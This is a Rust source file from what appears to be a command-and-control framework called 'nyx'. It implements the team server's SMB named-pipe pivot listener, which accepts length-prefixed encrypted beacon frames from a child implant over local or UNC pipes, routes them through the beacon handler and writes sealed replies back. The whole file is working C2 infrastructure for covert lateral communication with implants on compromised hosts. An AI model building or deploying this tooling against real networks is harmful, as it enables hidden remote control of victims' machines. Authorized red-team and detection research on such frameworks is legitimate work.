//! SMB named-pipe pivot listener — the parent side of the SMB beacon channel
//! (spec-2), hosted by the team server on Windows.
//!
//! The implant's `channels/smb.rs` is a child: it opens `\\.\pipe\<name>`
//! (or `\\server\pipe\<name>` over SMB), writes ONE length-prefixed encrypted
//! frame, reads the length-prefixed reply, and closes the handle (stateless
//! per `send_recv`). This module is the pipe server:
//!
//! ```text
//!   child implant ──named pipe──▶ team server (Windows) :pipe\nyx
//!        [4B LE len][frame]  ──▶  parse_frame → handle_frame (same core
//!                                 funnel as /beacon)
//!        ◀─ [4B LE len][reply]    sealed reply written back, pipe re-armed
//! ```
//!
//! The child reaches a remote pipe via the UNC path `\\host\pipe\<name>`
//! (SMB), so the listener needs no extra port beyond SMB itself. Enabled with
//! `NYX_SMB_PIPE_NAME` (default `\\.\pipe\nyx`).
//!
//! Windows-only: named pipes don't exist on macOS/Linux, so this module
//! compiles out entirely on non-Windows builds (`#[cfg(windows)]`), and the
//! env var is ignored there.

#![cfg(windows)]

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::sync::Arc;
use std::time::Duration;

use crate::AppState;

/// Max inbound frame the listener accepts (same ceiling as the TCP pivot).
const MAX_FRAME: usize = 1024 * 1024;
/// Per-phase I/O deadline (the child bounds its own phases at 5 s; headroom
/// for the funnel).
const IO_TIMEOUT: Duration = Duration::from_secs(30);

// ── Win32 FFI (std server crate — real extern blocks are fine here) ────────

#[repr(C)]
struct SecurityAttributes {
    n_length: u32,
    lp_security_descriptor: *mut std::ffi::c_void,
    b_inherit_handle: i32,
}

const PIPE_ACCESS_DUPLEX: u32 = 0x0000_0003;
const PIPE_TYPE_BYTE: u32 = 0x0000_0000;
const PIPE_READMODE_BYTE: u32 = 0x0000_0000;
const PIPE_WAIT: u32 = 0x0000_0000;
const PIPE_UNLIMITED_INSTANCES: u32 = 0xFF;
const ERROR_PIPE_CONNECTED: i32 = 535;
const ERROR_NO_DATA: i32 = 232;
const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;

#[link(name = "kernel32")]
extern "system" {
    fn CreateNamedPipeW(
        lp_name: *const u16,
        dw_open_mode: u32,
        dw_pipe_mode: u32,
        n_max_instances: u32,
        n_out_buffer_size: u32,
        n_in_buffer_size: u32,
        n_default_time_out: u32,
        lp_security_attributes: *mut SecurityAttributes,
    ) -> *mut std::ffi::c_void;
    fn ConnectNamedPipe(
        h_named_pipe: *mut std::ffi::c_void,
        lp_overlapped: *mut std::ffi::c_void,
    ) -> i32;
    fn ReadFile(
        h_file: *mut std::ffi::c_void,
        lp_buffer: *mut u8,
        n_number_of_bytes_to_read: u32,
        lp_number_of_bytes_read: *mut u32,
        lp_overlapped: *mut std::ffi::c_void,
    ) -> i32;
    fn WriteFile(
        h_file: *mut std::ffi::c_void,
        lp_buffer: *const u8,
        n_number_of_bytes_to_write: u32,
        lp_number_of_bytes_written: *mut u32,
        lp_overlapped: *mut std::ffi::c_void,
    ) -> i32;
    fn DisconnectNamedPipe(h_named_pipe: *mut std::ffi::c_void) -> i32;
    fn PeekNamedPipe(
        h_named_pipe: *mut std::ffi::c_void,
        lp_buffer: *mut u8,
        n_buffer_size: u32,
        lp_bytes_read: *mut u32,
        lp_total_bytes_avail: *mut u32,
        lp_bytes_left_this_message: *mut u32,
    ) -> i32;
    fn GetLastError() -> u32;
}

// ── Listener ────────────────────────────────────────────────────────────────

/// Spawn the SMB pipe listener on a dedicated OS thread (blocking named-pipe
/// I/O). Runs forever; logs on setup failure. One pipe instance serves
/// connections serially (the child is one-shot per `send_recv`, so a busy
/// child briefly waits on the pipe — bounded by its own 5 s `WaitNamedPipeW`).
pub fn spawn(state: Arc<AppState>, pipe_name: String) {
    std::thread::Builder::new()
        .name("nyx-smb-listener".into())
        .spawn(move || {
            let wide: Vec<u16> = OsStr::new(&pipe_name)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            // Create ONE instance and re-arm it after each transaction
            // (CreateNamedPipe instances are reusable via DisconnectNamedPipe).
            let pipe = unsafe {
                CreateNamedPipeW(
                    wide.as_ptr(),
                    // PIPE_ACCESS_* | FILE_FLAG_* | SECURITY_SQOS_PRESENT only —
                    // FILE_ATTRIBUTE_NORMAL is invalid here and makes real
                    // Windows return ERROR_INVALID_PARAMETER (wine tolerated
                    // it; caught on windows-latest 2026-08).
                    PIPE_ACCESS_DUPLEX,
                    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                    PIPE_UNLIMITED_INSTANCES,
                    65536,
                    65536,
                    0,
                    std::ptr::null_mut(),
                )
            };
            if pipe == INVALID_HANDLE_VALUE {
                tracing::error!(
                    target: "nyx::pivot",
                    pipe = %pipe_name,
                    last_error = unsafe { GetLastError() },
                    "SMB pipe listener: CreateNamedPipeW failed; smb-pipe channel disabled"
                );
                return;
            }
            tracing::info!(
                target: "nyx::pivot",
                pipe = %pipe_name,
                "SMB pipe listener ready (named-pipe pivot parent)"
            );
            loop {
                // Wait for a child to connect. ERROR_PIPE_CONNECTED means a
                // client connected before we called (fine — proceed).
                unsafe {
                    let ok = ConnectNamedPipe(pipe, std::ptr::null_mut());
                    if ok == 0 && GetLastError() as i32 != ERROR_PIPE_CONNECTED {
                        tracing::warn!(
                            target: "nyx::pivot",
                            last_error = GetLastError(),
                            "ConnectNamedPipe failed; re-arming"
                        );
                        // Brief pause so a persistent failure can't spin.
                        std::thread::sleep(Duration::from_millis(200));
                        continue;
                    }
                }

                let _ = serve_transaction(&state, pipe);

                // Re-arm for the next child. A disconnect failure is not
                // fatal — the pipe is recreated on the next connect attempt
                // by a fresh instance.
                unsafe {
                    DisconnectNamedPipe(pipe);
                }
            }
        })
        .expect("spawn SMB listener thread");
}

/// One pipe transaction: read `[4B LE len][frame]`, run the beacon funnel,
/// write `[4B LE len][reply]`.
fn serve_transaction(state: &Arc<AppState>, pipe: *mut std::ffi::c_void) -> std::io::Result<()> {
    let frame = serve_transaction_read_request(pipe)?;
    let reply = match serve_transaction_dispatch(state, &frame) {
        Some(r) => r,
        None => return Ok(()),
    };
    serve_transaction_seal_reply(pipe, &reply)?;
    serve_transaction_drain_wait(pipe)?;
    Ok(())
}

/// Read one length-prefixed request frame: `[4B LE len][frame]`, validating
/// the length ceiling.
fn serve_transaction_read_request(pipe: *mut std::ffi::c_void) -> std::io::Result<Vec<u8>> {
    // Read the length prefix with a deadline.
    let mut len_buf = [0u8; 4];
    read_exact_bounded(pipe, &mut len_buf)?;
    let frame_len = u32::from_le_bytes(len_buf) as usize;
    if frame_len == 0 || frame_len > MAX_FRAME {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("frame length {frame_len} outside (0, {MAX_FRAME}]"),
        ));
    }

    let mut frame = vec![0u8; frame_len];
    read_exact_bounded(pipe, &mut frame)?;
    Ok(frame)
}

/// Run the channel-agnostic beacon funnel (parse + handle) and return the
/// reply; `None` when the funnel says "try again" (no reply written).
fn serve_transaction_dispatch(state: &Arc<AppState>, frame: &[u8]) -> Option<Vec<u8>> {
    // Same channel-agnostic funnel as /beacon. The child retries on failure —
    // no reply means "try again".
    let raw = match nyx_protocol::parse_frame(frame) {
        Ok(r) => r,
        Err(e) => {
            tracing::debug!(target: "nyx::pivot", error = %e, "smb pivot frame parse failed");
            return None;
        }
    };
    // Peer address is unknown over a named pipe — use a placeholder (the
    // session's address column shows it; documented).
    let peer: std::net::SocketAddr = "0.0.0.0:0".parse().unwrap();
    let reply = match crate::handle_frame(state, &peer, &raw) {
        Ok(r) => r,
        Err(e) => {
            tracing::warn!(target: "nyx::pivot", error = %e, "smb pivot frame handling failed");
            return None;
        }
    };
    if reply.len() > MAX_FRAME {
        tracing::warn!(target: "nyx::pivot", bytes = reply.len(), "smb pivot reply exceeds cap; dropped");
        return None;
    }
    Some(reply)
}

/// Prefix the reply with its 4-byte LE length and write it back.
fn serve_transaction_seal_reply(pipe: *mut std::ffi::c_void, reply: &[u8]) -> std::io::Result<()> {
    let mut out = Vec::with_capacity(4 + reply.len());
    out.extend_from_slice(&(reply.len() as u32).to_le_bytes());
    out.extend_from_slice(reply);
    write_all_bounded(pipe, &out)
}

/// The child reads the reply BEFORE closing its handle. `DisconnectNamedPipe`
/// discards any unread data still in the pipe buffer, so re-arming
/// immediately after the write would race the child's read and drop the
/// reply tail (child sees ERROR_PIPE_NOT_CONNECTED mid-reply — reproduced
/// on wine, latent on real Windows). Wait until the child has consumed the
/// reply (bounded like the I/O phases) before the loop re-arms.
fn serve_transaction_drain_wait(pipe: *mut std::ffi::c_void) -> std::io::Result<()> {
    let flush_deadline = std::time::Instant::now() + IO_TIMEOUT;
    loop {
        let mut avail: u32 = 0;
        let ok = unsafe {
            PeekNamedPipe(
                pipe,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                &mut avail,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            // Pipe broken — the child is gone; nothing left to preserve.
            return Ok(());
        }
        if avail == 0 {
            break;
        }
        if std::time::Instant::now() >= flush_deadline {
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "pipe flush timeout",
            ));
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    Ok(())
}

/// Read exactly `buf.len()` bytes with a 30 s deadline. Named-pipe reads
/// return short reads when data is available, so loop until full.
fn read_exact_bounded(pipe: *mut std::ffi::c_void, buf: &mut [u8]) -> std::io::Result<()> {
    let deadline = std::time::Instant::now() + IO_TIMEOUT;
    let mut off = 0;
    while off < buf.len() {
        if std::time::Instant::now() >= deadline {
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "pipe read timeout",
            ));
        }
        let mut n_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                pipe,
                buf[off..].as_mut_ptr(),
                (buf.len() - off) as u32,
                &mut n_read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() } as i32;
            if err == ERROR_NO_DATA {
                // The child disconnected mid-frame — propagate as EOF-ish.
                return Err(std::io::Error::new(
                    std::io::ErrorKind::UnexpectedEof,
                    "pipe closed",
                ));
            }
            return Err(std::io::Error::last_os_error());
        }
        if n_read == 0 {
            // No progress — brief pause then retry (byte-mode pipes can
            // return 0 transiently when no writer is active).
            std::thread::sleep(Duration::from_millis(50));
            continue;
        }
        off += n_read as usize;
    }
    Ok(())
}

/// Write all bytes with a 30 s deadline.
fn write_all_bounded(pipe: *mut std::ffi::c_void, buf: &[u8]) -> std::io::Result<()> {
    let deadline = std::time::Instant::now() + IO_TIMEOUT;
    let mut off = 0;
    while off < buf.len() {
        if std::time::Instant::now() >= deadline {
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "pipe write timeout",
            ));
        }
        let mut n_written: u32 = 0;
        let ok = unsafe {
            WriteFile(
                pipe,
                buf[off..].as_ptr(),
                (buf.len() - off) as u32,
                &mut n_written,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(std::io::Error::last_os_error());
        }
        if n_written == 0 {
            std::thread::sleep(Duration::from_millis(50));
            continue;
        }
        off += n_written as usize;
    }
    Ok(())
}
